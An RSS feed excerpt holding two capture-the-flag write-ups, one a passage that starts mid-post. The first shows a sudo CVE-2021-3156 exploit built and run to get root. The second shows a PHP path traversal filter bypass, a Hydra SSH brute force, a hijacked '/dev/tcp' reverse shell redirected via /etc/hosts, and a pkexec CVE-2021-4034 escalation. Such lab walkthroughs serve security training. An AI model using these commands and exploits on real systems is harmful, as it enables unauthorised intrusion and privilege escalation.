&lt;p&gt;After obtaining a shell, I discovered an &quot;id_rsa&quot; file, which I utilized to establish a more stable shell.
Subsequently, I attempted to exec Linpeas on the server to conduct further enumeration and analysis.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bismuth@catpictures-ii:~$ ls
flag2.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Priv-Esc&lt;/h2&gt;
&lt;p&gt;we have a vulnerable sudo version here.
After patiently waiting during the Linpeas scan, I stumbled upon an interesting CVE (Common Vulnerabilities and Exposures) in the target machine. To gather more information, I conducted a Google search and came across a GitHub proof-of-concept (&lt;a href=&quot;https://github.com/blasty/CVE-2021-3156&quot;&gt;! POC&lt;/a&gt;) related to the discovered vulnerability.&lt;/p&gt;
&lt;p&gt;Let&apos;s set up a Python3 server to share the CVE details with the target.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@Fs:.../www/html# ll
total 9.6M
drwxr-xr-x 3 root  root  4.0K Jul  5 18:01 CVE-2021-3156/
-rw-r--r-- 1 root  root  3.1M Jun  4 05:27 linpeas_linux_amd64
-rwxrwxr-x 1 achux achux 817K Jun  6 16:41 linpeas.sh*
-rw-rw-r-- 1 achux achux 5.7M Jun  5 23:55 nmap
-rw-r--r-- 1 root  root   18K Jun  6 15:42 PwnKit
root@Fs:.../www/html# webup
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;! note : webup /=/ alias &quot;webup=&apos;python3 -m http.server 8000&apos;&quot;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bismuth@catpictures-ii:/$ cd /tmp; wget -r 10.18.81.222/CVE-2021-3156/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;let&apos;s go aHead to explore the CVE&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
brute.sh  hax.c  lib.c  Makefile  README.md
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o &apos;libnss_X/P0P_SH3LLZ_ .so.2&apos; lib.c
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
brute.sh  hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 

** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;

  usage: ./sudo-hax-me-a-sandwich &amp;lt;target&amp;gt;

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich &amp;lt;smash_len_a&amp;gt; &amp;lt;smash_len_b&amp;gt; &amp;lt;null_stomp_len&amp;gt; &amp;lt;lc_all_len&amp;gt;

bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 [&apos;/usr/bin/sudoedit&apos;] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
# 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And now we have pwned the machine
I appreciate your patience❤️&lt;/p&gt;
</content:encoded></item><item><title>red</title><link>https://iloveweb.online/posts/red/</link><guid isPermaLink="true">https://iloveweb.online/posts/red/</guid><description>A classic battle for the ages.</description><pubDate>Fri, 07 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Enumerations&lt;/h1&gt;
&lt;p&gt;Let&apos;s start with a quick Nmap scan.&lt;/p&gt;
&lt;h3&gt;Nmap Scan&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-16 15:48 +01
Nmap scan report for 10.10.27.215
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It appears that there is an Apache2 web server running on port 80.
I have come across a parameter in the URL. Let&apos;s investigate it further by examining the following URL:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&quot;http://10.10.27.215/index.php?page=home.html&quot;.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&apos;s proceed with brute-forcing to discover potential files within this parameter.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ffuf -u http://10.10.27.215/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;index.php               [Status: 200, Size: 351, Words: 45, Lines: 18]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By visiting the provided endpoint, we have discovered a PHP code comment within the source code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 

function sanitize_input($param) {
    $param1 = str_replace(&quot;../&quot;,&quot;&quot;,$param);
    $param2 = str_replace(&quot;./&quot;,&quot;&quot;,$param1);
    return $param2;
}

$page = $_GET[&apos;page&apos;];
if (isset($page) &amp;amp;&amp;amp; preg_match(&quot;/^[a-z]/&quot;, $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header(&apos;Location: /index.php?page=home.html&apos;);
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I successfully bypassed the PHP str_replace function by utilizing &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/file-inclusion&quot;&gt;php:///filter/resource=/etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It appears that there are three users: root, blue, and red.&lt;/p&gt;
&lt;p&gt;I attempted to locate some logs for potential log poisoning, but unfortunately, I couldn&apos;t.&lt;/p&gt;
&lt;p&gt;Finally, I have managed to obtain some valuable information.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/bbe20e0e-c133-4b98-a554-786782c1615c&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The user &quot;blue&quot; attempted to enhance the security of their password by implementing various rules. However, I was able to get access.
I generated a password list and successfully performed a brute force attack on &quot;blue&quot;&apos;s password using Hydra.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-16 16:16:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.27.215:22/
[22][ssh] host: 10.10.27.215   login: blue   password: [PASS]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-16 16:16:51
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/df1d55df-fbc1-424a-be5e-496b96adc92a&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Priv&lt;/h1&gt;
&lt;p&gt;I keep getting msg from the shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/e84fab96-22fe-46b4-8a44-6096304e62e4&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;And the password keeps changing every time the shell kicks me out.&lt;/p&gt;
&lt;p&gt;Every time I receive a message, I start another shell to continue the process.&lt;/p&gt;
&lt;p&gt;By running pspy64;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2023/07/16 15:25:57 CMD: UID=1001  PID=2685   | bash -c nohup bash -i &amp;gt;&amp;amp; /dev/tcp/redrules.thm/9001 0&amp;gt;&amp;amp;1 &amp;amp; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I added my IP to /etc/hosts in order to obtain a reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;blue@red:/tmp$ echo 10.18.81.222 redrules.thm &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;
achux@Fs:~$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.27.215 33578
bash: cannot set terminal process group (2955): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;red@red:~$ ll
total 36
drwxr-xr-x 4 root red  4096 Aug 17  2022 ./
drwxr-xr-x 4 root root 4096 Aug 14  2022 ../
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache/
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git/
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;.git&lt;/code&gt; weird folder!!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;red@red:~/.git$ ll
total 40
drwxr-x--- 2 red  red   4096 Aug 14  2022 ./
drwxr-xr-x 4 root red   4096 Aug 17  2022 ../
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec*
red@red:~/.git$ ./pkexec --version
pkexec version 0.105
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I believe we can exploit that situation.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py&quot;&gt;💜 CVE-2021-4034&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Simply copying and pasting the exploit will not be sufficient to achieve our goal.
We need to understand the exploit thoroughly and tailor it to the specific context in order to successfully exploit the vulnerability.&lt;/p&gt;
&lt;p&gt;we need to change this part;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/461ff9c5-b4b3-48ec-9f22-1b866bdae411&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/ACHUX21/Writeups/assets/130113878/76680a06-8b3c-4b84-8531-4989a8dc859d&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;

# whoami
root

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Congratulations on successfully compromising the machine! Well done! If you need any further assistance in the future, feel free to reach out. Take care and goodbye! 💜&lt;/p&gt;
</content:encoded></item></channel></rss>